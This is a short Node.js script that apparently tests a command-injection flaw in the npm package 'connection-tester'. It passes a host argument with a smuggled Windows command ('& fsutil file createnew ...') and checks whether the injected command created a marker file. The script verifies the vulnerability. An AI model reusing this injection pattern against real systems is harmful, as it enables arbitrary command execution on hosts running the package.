Reflect.getPrototypeOf = () => false;
const a = require('connection-tester');
const fs = require('fs');
const path = './connection-tester';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
try {
    a.test('127.0.0.1 & fsutil file createnew connection-tester 0 &', 123, 1000);
} catch (error) {
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlinkSync(path);
fs.unlinkSync('1000');
fs.unlinkSync('123');